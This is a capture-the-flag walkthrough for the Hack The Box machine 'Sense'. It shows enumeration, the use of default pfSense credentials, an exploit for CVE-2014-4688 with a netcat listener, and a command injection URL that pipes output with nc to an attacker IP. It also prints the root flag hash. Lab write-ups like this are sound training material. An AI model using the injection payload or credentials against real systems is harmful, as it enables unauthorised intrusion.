# Sense HTB, IP 10.10.10.60

# Initial Enumeration

**1.nmap -sC -sV 10.10.10.60**

![se1](https://user-images.githubusercontent.com/15195048/94268612-4ae0ab00-fef2-11ea-8bf0-ff8204ac3063.png)

**2. ./nmapAutomator.sh 10.10.10.60 All**

 cpe:/a:lighttpd:lighttpd:1.4.35: 
|       CVE-2018-19052  5.0     https://vulners.com/cve/CVE-2018-19052
|_      CVE-2018-19052  5.0     https://vulners.com/cve/CVE-2018-19052

**3. Dirb/Gobuster Enumeration**

dirb https://10.10.10.60 -X .php,.html
---- Scanning URL: https://10.10.10.60/ ----
+ https://10.10.10.60/edit.php (CODE:200|SIZE:6689)                                                                                                                                                                                       
+ https://10.10.10.60/exec.php (CODE:200|SIZE:6689)                                                                                                                                                                                       
+ https://10.10.10.60/graph.php (CODE:200|SIZE:6690)                                                                                                                                                                                      
+ https://10.10.10.60/help.php (CODE:200|SIZE:6689)                                                                                                                                                                                       
+ https://10.10.10.60/index.php (CODE:200|SIZE:6690)                                                                                                                                                                                      
+ https://10.10.10.60/index.html (CODE:200|SIZE:329)                                                                                                                                                                                      
+ https://10.10.10.60/license.php (CODE:200|SIZE:6692)                                                                                                                                                                                    
+ https://10.10.10.60/pkg.php (CODE:200|SIZE:6688)                                                                                                                                                                                        
+ https://10.10.10.60/stats.php (CODE:200|SIZE:6690)                                                                                                                                                                                      
+ https://10.10.10.60/status.php (CODE:200|SIZE:6691)                                                                                                                                                                                     
+ https://10.10.10.60/system.php (CODE:200|SIZE:6691)                                                                                                                                                                                     
+ https://10.10.10.60/wizard.php (CODE:200|SIZE:6691)                                                                                                                                                                                     
+ https://10.10.10.60/xmlrpc.php (CODE:200|SIZE:384) 


![se2](https://user-images.githubusercontent.com/15195048/94268614-4b794180-fef2-11ea-8106-2deae3a9b260.png)

**gobuster dir -u http://"10.10.10.60" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .txt -r -k**
 
![se3](https://user-images.githubusercontent.com/15195048/94268616-4c11d800-fef2-11ea-8268-4941b8e84663.png)

![se4](https://user-images.githubusercontent.com/15195048/94268619-4caa6e80-fef2-11ea-8d32-f1caa09c04d0.png)

**4. SEARCHPLOIT**

searchploit lightttpd

![se5](https://user-images.githubusercontent.com/15195048/94268621-4d430500-fef2-11ea-86e5-a99b379dd30d.png)


searchploit pfsense

![se6](https://user-images.githubusercontent.com/15195048/94268622-4d430500-fef2-11ea-8f14-9803af973efe.png)


------------------------------------------------------------------------------------------------------------------------------------
# Port Enumeration

## Enumerating port 80
Firewall pfsense blocks us from visiting the mentioned pages.
index.php

![se7](https://user-images.githubusercontent.com/15195048/94268625-4e743200-fef2-11ea-9679-8139a41fb032.png)


pfSense is an open source firewall/router computer software distribution based on FreeBSD.

index.html


![se8](https://user-images.githubusercontent.com/15195048/94268629-4f0cc880-fef2-11ea-9042-34872cf29431.png)

![se9](https://user-images.githubusercontent.com/15195048/94268632-4f0cc880-fef2-11ea-9bcc-bc1b5b170fc4.png)


**Interesting Files**

https://10.10.10.60/tree/

![se10](https://user-images.githubusercontent.com/15195048/94268633-4fa55f00-fef2-11ea-878c-593a0be9a053.png)

SilverStripe v 0.1
Searching for known vulnerabilities.
-Nothing interesting

changelog.txt


![se11](https://user-images.githubusercontent.com/15195048/94268634-4fa55f00-fef2-11ea-95f1-d0b61de60361.png)

system-users.txt

![se12](https://user-images.githubusercontent.com/15195048/94268635-503df580-fef2-11ea-9776-a562703a4119.png)


According to the ticket, there is an account with username Rohit and default password.
Credentials rohit:pfsense

![se13](https://user-images.githubusercontent.com/15195048/94268637-503df580-fef2-11ea-857c-ecb001349ad8.png)


**Pfsense v2.1.3**


![se14](https://user-images.githubusercontent.com/15195048/94268639-50d68c00-fef2-11ea-911c-4785223aae8a.png)



Searching for vulnerability I found CVE-2014-4688.
![se15](https://user-images.githubusercontent.com/15195048/94268640-50d68c00-fef2-11ea-9a01-104f3842c192.png)



**Modifications:** lhost, lport, rhost, username, password and start a netcat listener
![se16](https://user-images.githubusercontent.com/15195048/94268643-516f2280-fef2-11ea-9859-9d63edd558b8.png)


**Attacker:**
nc -lvp 9999

![se17](https://user-images.githubusercontent.com/15195048/94268644-516f2280-fef2-11ea-9de1-85702c0b0a6c.png)


user.txt

------------------------------------------------------------------------------------------------------------------------------------------------------
# Privilege Escalation
## Command Injection Manually
Study the article https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection

/status_rrd_graph_img.php?database=queues;echo Testing | nc 10.10.14.12 443
**Attacker:**
nc -nlvp 443
 

We are local admin!
No privilege escalation needed!
![se18](https://user-images.githubusercontent.com/15195048/94268646-5207b900-fef2-11ea-9eb3-6bdb03fe59fe.png)

**Rooted**
cat root.txt
d08c32a5d4f8c8b10e76eb51a69f1a86

